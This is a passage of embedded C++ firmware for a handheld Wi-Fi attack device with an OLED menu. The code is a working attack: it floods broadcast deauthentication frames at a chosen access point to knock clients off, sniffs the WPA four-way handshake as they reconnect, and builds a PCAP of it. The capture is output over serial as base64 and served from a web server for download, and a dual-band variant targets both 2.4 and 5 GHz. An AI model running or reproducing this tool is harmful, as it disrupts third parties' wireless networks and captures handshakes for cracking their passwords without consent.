      // Allow user to cancel sniffing by pressing OK.
      if (digitalRead(BTN_OK) == LOW) {
          Serial.println("User canceled sniffing.");
          cancelled = true;
          break;
      }
  }
  
  // Disable promiscuous mode.
  disableSniffing();
  
  // Final update: show final count and a prompt to go back.
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
  display.setCursor(5, 20);
  if (cancelled) {
      display.println("Sniffing canceled!");
  } else if (capturedHandshake.frameCount >= MAX_HANDSHAKE_FRAMES && capturedManagement.frameCount > 0) {
      display.println("Sniffing complete!");
  } else {
      display.println("Sniff timeout!");
  }
  display.setCursor(5, 40);
  display.println("Press OK to return");
  display.display();
  
  // Wait for the user to press the OK button (active low)
  while (digitalRead(BTN_OK) != LOW) {
    delay(10);
  }
  delay(150);  // Debounce delay

  Serial.println("Finished sniffing.");
}


#include <vector>



// Simple base64 encoder function.
String base64Encode(const uint8_t *data, size_t length) {
  const char* base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  String encoded = "";
  uint32_t octet_a, octet_b, octet_c;
  uint32_t triple;
  size_t i = 0;
  
  while (i < length) {
    octet_a = i < length ? data[i++] : 0;
    octet_b = i < length ? data[i++] : 0;
    octet_c = i < length ? data[i++] : 0;
    
    triple = (octet_a << 16) + (octet_b << 8) + octet_c;
    
    encoded += base64Chars[(triple >> 18) & 0x3F];
    encoded += base64Chars[(triple >> 12) & 0x3F];
    encoded += (i - 1 < length) ? base64Chars[(triple >> 6) & 0x3F] : '=';
    encoded += (i < length) ? base64Chars[triple & 0x3F] : '=';
  }
  return encoded;
}


// Function to generate the PCAP file, encode it in base64, and send to Serial.
void sendPcapToSerial() {
  Serial.println("Generating PCAP file...");
  std::vector<uint8_t> pcapBuffer = generatePcapBuffer();
  Serial.print("PCAP size: ");
  Serial.print(pcapBuffer.size());
  Serial.println(" bytes");
  
  String encodedPcap = base64Encode(pcapBuffer.data(), pcapBuffer.size());
  
  Serial.println("-----BEGIN PCAP BASE64-----");
  Serial.println(encodedPcap);
  Serial.println("-----END PCAP BASE64-----");
}

// TODO: make it attack on both 2.4ghz and 5ghz at "the same time"
void deauthAndSniffForNetwork(int netIndex) {
  Serial.print("Starting attack on ");
  Serial.print(scan_results[netIndex].ssid);
  Serial.print(" (channel ");
  Serial.print(scan_results[netIndex].channel);
  Serial.println(")");

  // Reset capture buffers.
  resetCaptureData();

  // Use a local copy of the BSSID.
  uint8_t local_bssid[6];
  memcpy(local_bssid, scan_results[netIndex].bssid, 6);

  // Set channel to the target AP's channel.
  wext_set_channel(WLAN0_NAME, scan_results[netIndex].channel);
  Serial.print("Switched to channel: ");
  Serial.println(scan_results[netIndex].channel);

  // Overall timeout for the cycle.
  unsigned long overallStart = millis();
  const unsigned long overallTimeout = 60000; // 60 seconds overall timeout

  // Phase durations.
  const unsigned long deauthInterval = 6000; // deauth phase
  const unsigned long sniffInterval = 5000;  // sniff phase

  // Outer loop: alternate deauth and sniff until handshake is complete or timeout.
  while ((capturedHandshake.frameCount < MAX_HANDSHAKE_FRAMES ||
          capturedManagement.frameCount == 0) &&
         (millis() - overallStart < overallTimeout)) {

    // ----- Deauth Phase -----
    Serial.println("Deauth phase...");
    unsigned long deauthPhaseStart = millis();
    while (millis() - deauthPhaseStart < deauthInterval) {
      // Send deauth frames.
      deauth_reason = 1;
      wifi_tx_deauth_frame(local_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      deauth_reason = 4;
      wifi_tx_deauth_frame(local_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      deauth_reason = 16;
      wifi_tx_deauth_frame(local_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      delay(100);
    }

    // ----- Sniff Phase -----
    Serial.println("Sniff phase...");
    enableSniffing();
    unsigned long sniffPhaseStart = millis();
    while (millis() - sniffPhaseStart < sniffInterval) {
      delay(100);
      // If handshake is complete, exit early.
      if (capturedHandshake.frameCount >= MAX_HANDSHAKE_FRAMES &&
          capturedManagement.frameCount > 0) {
        break;
      }
    }
    disableSniffing();

    // Check if handshake capture is complete.
    if (capturedHandshake.frameCount >= MAX_HANDSHAKE_FRAMES &&
        capturedManagement.frameCount > 0) {
      break;
    }
  }

  Serial.print("Attack on channel ");
  Serial.print(scan_results[netIndex].channel);
  Serial.print(" complete; handshake count: ");
  Serial.println(capturedHandshake.frameCount);

  // Optionally, send the captured PCAP over Serial.
  if (capturedHandshake.frameCount >= MAX_HANDSHAKE_FRAMES &&
      capturedManagement.frameCount > 0) {
    printHandshakeData();
    sendPcapToSerial();
  } else {
    Serial.println("Sniff timeout or incomplete handshake.");
  }
}


void dualAttackAndSniff(String targetSSID) {
  Serial.println("Checking for dual‑band availability for " + targetSSID);
  std::vector<int> candidates24;
  std::vector<int> candidates5;

  for (size_t i = 0; i < scan_results.size(); i++) {
    if (scan_results[i].ssid == targetSSID) {
      // For simplicity, assume channel < 36 is 2.4GHz.
      if (scan_results[i].channel < 36) {
        candidates24.push_back(i);
      } else {
        candidates5.push_back(i);
      }
    }
  }

  // If both bands are available:
  if (!candidates24.empty() && !candidates5.empty()) {
    Serial.println("Dual‑band detected. Running attack on both 2.4GHz and 5GHz.");

    // Attack on 2.4 GHz.
    Serial.println("Starting attack on 2.4GHz network...");
    deauthAndSniffForNetwork(candidates24[0]);
    // It’s important to reset capture data between attacks.
    resetCaptureData();
    delay(500);

    // Attack on 5 GHz.
    Serial.println("Starting attack on 5GHz network...");
    deauthAndSniffForNetwork(candidates5[0]);
  } else {
    Serial.println("Dual‑band not fully available. Running single frequency attack.");
    int index;
    if (!candidates24.empty()) {
      index = candidates24[0];
    } else if (!candidates5.empty()) {
      index = candidates5[0];
    } else {
      Serial.println("Error: No candidate networks found for target SSID.");
      return;
    }
    deauthAndSniffForNetwork(index);
  }
}



void deauthAndSniff() {
  // Reset capture buffers.
  resetCaptureData();

  // Set the channel to the target AP's channel.
  wext_set_channel(WLAN0_NAME, scan_results[selectedNetworkIndex].channel);
  Serial.print("Switched to channel: ");
  Serial.println(scan_results[selectedNetworkIndex].channel);

  // Overall timeout for the entire cycle.
  unsigned long overallStart = millis();
  const unsigned long overallTimeout = 60000; // 60 seconds overall timeout

  // Phase durations.
  const unsigned long deauthInterval = 5000; // deauth phase (5 sec)
  const unsigned long sniffInterval = 4000;  // sniff phase (4 sec)

  bool cancelled = false;

  // Function to check for a "long press" (held >500ms)
  auto checkForCancel = []() -> bool {
    if (digitalRead(BTN_OK) == LOW) {
      unsigned long pressStart = millis();
      while (digitalRead(BTN_OK) == LOW) {
        delay(10);
        if (millis() - pressStart > 500) {
          return true;
        }
      }
    }
    return false;
  };

  // Outer loop: alternate deauth and sniff until handshake complete,
  // timeout, or cancellation.
  while ((capturedHandshake.frameCount < MAX_HANDSHAKE_FRAMES ||
          capturedManagement.frameCount == 0) &&
         (millis() - overallStart < overallTimeout)) {

    if (checkForCancel()) {
      cancelled = true;
      Serial.println("User canceled deauth+sniff cycle.");
      break;
    }

    // ----- Deauth Phase -----
    Serial.println("Starting deauth phase...");
    unsigned long deauthPhaseStart = millis();
    while (millis() - deauthPhaseStart < deauthInterval) {
      if (checkForCancel()) {
        cancelled = true;
        break;
      }
      
      display.clearDisplay();
      display.setTextSize(1);
      display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
      display.setCursor(5, 10);
      display.print("Deauthing ");
      display.print(SelectedSSID);
      display.setCursor(5, 30);
      display.print("EAPOL: ");
      display.print(capturedHandshake.frameCount);
      display.print("/4");
      display.setCursor(5, 45);
      display.print("Progress: ");
      display.print(spinnerChars[spinnerIndex % 4]);
      display.display();

      memcpy(deauth_bssid, scan_results[scrollindex].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
      deauth_reason = 1;
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      deauth_reason = 4;
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      deauth_reason = 16;
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      delay(50);
    }
    if (cancelled) break;

    // ----- Sniff Phase -----
    Serial.println("Starting sniff phase...");
    enableSniffing();
    unsigned long sniffPhaseStart = millis();
    while (millis() - sniffPhaseStart < sniffInterval) {
      if (checkForCancel()) {
        cancelled = true;
        break;
      }
      // Update OLED with progress and spinner.
      display.clearDisplay();
      display.setTextSize(1);
      display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
      display.setCursor(5, 10);
      display.print("Sniffing ");
      display.print(SelectedSSID);
      display.setCursor(5, 30);
      display.print("EAPOL: ");
      display.print(capturedHandshake.frameCount);
      display.print("/4");
      display.setCursor(5, 45);
      display.print("Progress: ");
      display.print(spinnerChars[spinnerIndex % 4]);
      display.display();

      spinnerIndex++;
      delay(100);
      // Exit early if handshake complete.
      if (capturedHandshake.frameCount >= MAX_HANDSHAKE_FRAMES &&
          capturedManagement.frameCount > 0) {
        break;
      }
    }
    disableSniffing();
    if (cancelled) break;

    Serial.print("Current handshake count: ");
    Serial.println(capturedHandshake.frameCount);
  }
  
  // ----- Final Display Update -----
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);

  if (cancelled) {
    drawStatusBar("SNIFFING CANCELED");
    display.setCursor(5, 10);
    display.println("Press OK to return");
  } else if (capturedHandshake.frameCount >= MAX_HANDSHAKE_FRAMES &&
             capturedManagement.frameCount > 0) {
    drawStatusBar("SNIFFING OK");
    display.setCursor(5, 19);
    display.print("Connect to ");
    display.print(ssid);
    display.setCursor(5, 34);
    display.println("Download pcap from");
    display.setCursor(5, 46);
    display.print("http://");
    display.print(WiFi.localIP());
    display.display();

    WiFi.disconnect();  // Force a disconnect of the current AP
    delay(500); 
    WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
    delay(1000);  // Wait for AP mode to come up

    printHandshakeData();
    sendPcapToSerial();
    startWebServer();
  } else {
    display.clearDisplay();
    drawStatusBar("SNIFFING TIMEOUT");
    display.setCursor(5, 10);
    display.println("Press OK to return");
  }

  // Non-blocking wait loop that keeps refreshing the display and checking BTN_OK:
  unsigned long waitStart = millis();
  while (digitalRead(BTN_OK) != LOW) {
    // Every second, refresh a prompt (so the display doesn’t appear frozen).
    if (millis() - waitStart > 1000) {
      waitStart = millis();
      display.setCursor(5, 5);
      //display.print("Press OK to return");
      display.display();
    }
    delay(10);
    yield(); // Let background tasks (e.g. webserver) run.
  }
  delay(150); // Debounce delay.

  Serial.println("Finished deauth+sniff cycle.");
}


// Function to get the battery voltage (in volts)
float getBatteryVoltage() {
  int rawADC = analogRead(BATTERY_PIN);                // Read ADC value from PB3
  float pinVoltage = (rawADC / ADC_MAX) * ADC_REF_VOLTAGE; // Convert ADC reading to voltage at the divider node
  float batteryVoltage = pinVoltage * voltageDividerFactor; // Calculate actual battery voltage
  return batteryVoltage;
}

// Function to calculate battery percentage based on the voltage
float getBatteryPercentage() {
  float voltage = getBatteryVoltage();
  float percentage = (voltage - batteryMinVoltage) / (batteryMaxVoltage - batteryMinVoltage) * 100.0;
  // Clamp percentage between 0 and 100%
  if (percentage < 0)   percentage = 0;
  if (percentage > 100) percentage = 100;
  return percentage;
}

void loop() {
  unsigned long currentTime = millis();
  if (currentTime - lastBatteryMeasure >= BATTERY_MEASURE_INTERVAL) {
    lastBatteryMeasure = currentTime;
    
    // Measure battery
    lastBatteryVoltage = getBatteryVoltage(); 
    lastBatteryPercentage = getBatteryPercentage();
  }
  // Always draw the main menu.
  drawMainMenu();

  // Check if the OK (select) button was pressed.
  if (digitalRead(BTN_OK) == LOW) {
    if (currentTime - lastOkTime > DEBOUNCE_DELAY) {
      // Decide what to do based on the currently visible item.
      int actualIndex = selectedIndex + menuOffset;  // Map visible index to full array index.
      if (actualIndex == 0) {
        // "Attack" option
        attackLoop();
      } else if (actualIndex == 1) {
        // "Scan" option
        display.clearDisplay();
        drawScanScreen();
        if (scanNetworks() == 0) {
          drawStatusBar("SCAN COMPLETE");
          display.display();
          delay(1000);
        }
      } else if (actualIndex == 2) {
        // "Select" option
        networkSelectionLoop();
      } else if (actualIndex == 3) {
        // "Sniff" option
        startSniffing();
      } else if (actualIndex == 4) { 
          deauthAndSniff();
          /*
            // Check if the selected network (SelectedSSID) is available on both bands
            bool found24 = false, found5 = false;
            for (size_t i = 0; i < scan_results.size(); i++) {
              if (scan_results[i].ssid == SelectedSSID) {
                if (scan_results[i].channel < 36)
                  found24 = true;
                else
                  found5 = true;
              }
            }
            if (found24 && found5) {
              dualAttackAndSniff(SelectedSSID);
            } else {
              // Fall back to the original single frequency attack
              deauthAndSniff();
            }*/
      }
      lastOkTime = currentTime;
    }
  }

  // Handle BTN_DOWN
  if (digitalRead(BTN_UP) == LOW) {
    if (currentTime - lastDownTime > DEBOUNCE_DELAY) {
      // If the select button is held, we adjust the menu offset.
      if (digitalRead(BTN_OK) == LOW) {
        // If not at the bottom page yet, scroll down.
        if (menuOffset < TOTAL_MENU_ITEMS - 3) {
          menuOffset++;
          // Optionally, set selectedIndex to the middle (or leave as is)
          selectedIndex = 0;  // Reset visible selection
        }
      } else {
        // Normal navigation: move the selection down.
        if (selectedIndex < 2) {
          selectedIndex++;
        } else if (menuOffset < TOTAL_MENU_ITEMS - 3) {
          // If at the bottom of the visible list, scroll down.
          menuOffset++;
        }
      }
      lastDownTime = currentTime;
    }
  }

  // Handle BTN_UP
  if (digitalRead(BTN_DOWN) == LOW) {
    if (currentTime - lastUpTime > DEBOUNCE_DELAY) {
      if (digitalRead(BTN_OK) == LOW) {
        // With select pressed, scroll upward if possible.
        if (menuOffset > 0) {
          menuOffset--;
          selectedIndex = 0;  // or keep the same relative index
        }
      } else {
        // Normal navigation: move selection up.
        if (selectedIndex > 0) {
          selectedIndex--;
        } else if (menuOffset > 0) {
          menuOffset--;
        }
      }
      lastUpTime = currentTime;
    }
  }
}

